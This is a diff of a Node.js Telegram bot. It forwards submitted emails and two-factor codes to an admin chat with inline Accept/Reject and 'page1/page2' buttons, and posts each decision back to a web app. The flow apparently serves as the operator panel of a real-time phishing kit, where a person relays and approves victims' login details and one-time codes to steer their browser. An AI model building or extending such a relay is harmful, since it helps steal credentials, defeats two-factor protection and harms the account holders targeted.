@@ -14,34 +14,91 @@ if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
 // -----------------
-// 2FA Code Backend
+// 2FA Code Backend (with requestId for frontend integration)
 // -----------------
 let pendingRequests = {};
 
-// Send 2FA code to a user with Accept/Reject keyboard
-function send2FACode(code, chatId) {
-  pendingRequests[chatId] = true;
-  bot.sendMessage(chatId, `Your 2FA code is: ${code}`, {
+// Send 2FA code to admin with Accept/Reject inline keyboard, callback_data includes requestId
+function send2FACode(code, requestId) {
+  pendingRequests[requestId] = true;
+  bot.sendMessage(ADMIN_CHAT_ID, `2FA code: ${code}\nRequest ID: ${requestId}`, {
     reply_markup: {
-      keyboard: [['Accept', 'Reject']],
-      one_time_keyboard: true,
-    },
+      inline_keyboard: [
+        [
+          { text: 'Accept', callback_data: `2fa_accept|${requestId}` },
+          { text: 'Reject', callback_data: `2fa_reject|${requestId}` }
+        ]
+      ]
+    }
   });
 }
 
-// Listen for Accept/Reject replies for 2FA
-bot.on('message', (msg) => {
-  const chatId = msg.chat.id;
-  // Ignore commands and callback queries
-  if (msg.text && !msg.text.startsWith('/') && pendingRequests[chatId]) {
-    if (msg.text === 'Accept') {
-      bot.sendMessage(chatId, '2FA code accepted. Redirecting...');
-      // Logic to redirect to the next page can be added here
-      delete pendingRequests[chatId];
-    } else if (msg.text === 'Reject') {
-      bot.sendMessage(chatId, '2FA code rejected. Please try again.');
-      delete pendingRequests[chatId];
+// Listen for Accept/Reject replies for 2FA (inline)
+bot.on('callback_query', async (query) => {
+  const chatId = query.message.chat.id;
+  const [action, requestId] = query.data.split('|');
+  if (pendingRequests[requestId]) {
+    if (action === '2fa_accept') {
+      await fetch(`${APP_URL}/api/update-2fa-status`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ requestId, status: 'approved' })
+      });
+      bot.sendMessage(chatId, `2FA code for request ${requestId} accepted.`);
+      delete pendingRequests[requestId];
+    } else if (action === '2fa_reject') {
+      await fetch(`${APP_URL}/api/update-2fa-status`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ requestId, status: 'rejected' })
+      });
+      bot.sendMessage(chatId, `2FA code for request ${requestId} rejected.`);
+      delete pendingRequests[requestId];
     }
+    bot.answerCallbackQuery(query.id);
+    return;
+  }
+
+  // Handle other callback queries (for other approval flows)
+  try {
+    const [action2, identifier] = query.data.split("|");
+    let status;
+    if (action2 === "accept") status = "accepted";
+    else if (action2 === "page1") status = "accepted1";
+    else if (action2 === "page2") status = "accepted2";
+    else status = "rejected";
+
+    await fetch(`${APP_URL}/update-status`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email: identifier, identifier, status })
+    });
+
+    try {
+      await bot.editMessageText(
+        `🔐 <b>${identifier}</b> has been <b>${status.toUpperCase()}</b>`,
+        {
+          chat_id: query.message.chat.id,
+          message_id: query.message.message_id,
+          parse_mode: "HTML"
+        }
+      );
+    } catch {
+      await bot.editMessageText(
+        `🔐 ${identifier} has been *${status.toUpperCase()}*`,
+        {
+          chat_id: query.message.chat.id,
+          message_id: query.message.message_id,
+          parse_mode: "Markdown"
+        }
+      );
+    }
+
+    await bot.answerCallbackQuery(query.id, { text: `❗️${status.toUpperCase()}❗️` });
+
+  } catch (err) {
+    console.error("❌ Failed to handle callback:", err);
+    bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error handling approval`);
   }
 });
 
@@ -151,54 +208,6 @@ async function sendLoginTelegram(email) {
   const message = `📧 *Email:* ${email}`;
   await bot.sendMessage(ADMIN_CHAT_ID, message, options);
 }
-
-// -----------------
-// Handle button clicks (merged, with page1/page2 support)
-// -----------------
-bot.on("callback_query", async (query) => {
-  try {
-    const [action, identifier] = query.data.split("|");
-    let status;
-    if (action === "accept") status = "accepted";
-    else if (action === "page1") status = "accepted1";
-    else if (action === "page2") status = "accepted2";
-    else status = "rejected";
-
-    // Notify backend
-    await fetch(`${APP_URL}/update-status`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ email: identifier, identifier, status })
-    });
-
-    // Try HTML first, fallback to Markdown
-    try {
-      await bot.editMessageText(
-        `🔐 <b>${identifier}</b> has been <b>${status.toUpperCase()}</b>`,
-        {
-          chat_id: query.message.chat.id,
-          message_id: query.message.message_id,
-          parse_mode: "HTML"
-        }
-      );
-    } catch {
-      await bot.editMessageText(
-        `🔐 ${identifier} has been *${status.toUpperCase()}*`,
-        {
-          chat_id: query.message.chat.id,
-          message_id: query.message.message_id,
-          parse_mode: "Markdown"
-        }
-      );
-    }
-
-    await bot.answerCallbackQuery(query.id, { text: `❗️${status.toUpperCase()}❗️` });
-
-  } catch (err) {
-    console.error("❌ Failed to handle callback:", err);
-    bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error handling approval`);
-  }
-});
 
 // /start command for big bot
 bot.onText(/\/start/, (msg) => {
